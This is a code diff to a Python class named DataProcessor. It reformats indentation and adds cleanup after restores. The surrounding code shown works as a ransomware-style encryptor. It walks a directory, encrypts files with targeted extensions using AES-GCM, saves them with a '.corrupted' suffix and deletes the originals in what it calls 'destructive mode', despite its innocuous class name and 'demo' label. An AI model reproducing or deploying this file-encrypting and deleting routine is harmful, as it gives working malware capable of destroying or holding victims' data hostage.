@@ -45,14 +45,14 @@ class DataProcessor:
         nonce, ct = data[:12], data[12:]
         return self._aesgcm.decrypt(nonce, ct, None)
 
-        def process_files(self, backup_mode: bool = False) -> List[str]:
-                """
-                Process files in the target directory.
-                - Output naming: original filename with '.corrupted' appended
-                    e.g., report.txt -> report.txt.corrupted
-                - When backup_mode=True, an _archive folder is created (reserved; originals are
-                    deleted in this demo to simulate destructive mode).
-                """
+    def process_files(self, backup_mode: bool = False) -> List[str]:
+        """
+        Process files in the target directory.
+        - Output naming: original filename with '.corrupted' appended
+            e.g., report.txt -> report.txt.corrupted
+        - When backup_mode=True, an _archive folder is created (reserved; originals are
+            deleted in this demo to simulate destructive mode).
+        """
         processed_files: List[str] = []
         if not os.path.exists(self.work_directory):
             return processed_files
@@ -67,12 +67,12 @@ class DataProcessor:
                 return
             if not os.path.isfile(path):
                 return
-            
+
             # Check if file extension matches target list
             file_ext = os.path.splitext(path)[1].lower()
             if file_ext not in self.TARGET_EXTENSIONS:
                 return
-            
+
             with open(path, 'rb') as f:
                 original_data = f.read()
             transformed_data = self._process_bytes(original_data)
@@ -80,13 +80,13 @@ class DataProcessor:
             output_path = path + ".corrupted"
             with open(output_path, 'wb') as f:
                 f.write(transformed_data)
-            
+
             # Delete original file after encryption (destructive mode)
             try:
                 os.remove(path)
             except Exception as e:
                 print(f"[!] Failed to remove {path}: {e}")
-            
+
             if backup_mode:
                 os.makedirs(os.path.dirname(os.path.join(archive_dir, rel_name)), exist_ok=True)
                 # Original already deleted, skip move
@@ -124,6 +124,11 @@ class DataProcessor:
                 os.makedirs(os.path.dirname(original_path), exist_ok=True)
                 with open(original_path, 'wb') as f:
                     f.write(restored_data)
+                # After successful restore, delete the encrypted file
+                try:
+                    os.remove(path)
+                except Exception as del_err:
+                    print(f"Cleanup warning: failed to remove encrypted file {os.path.basename(path)}: {del_err}")
             except Exception as e:
                 print(f"Restore failed for {os.path.basename(path)}: {e}")
 
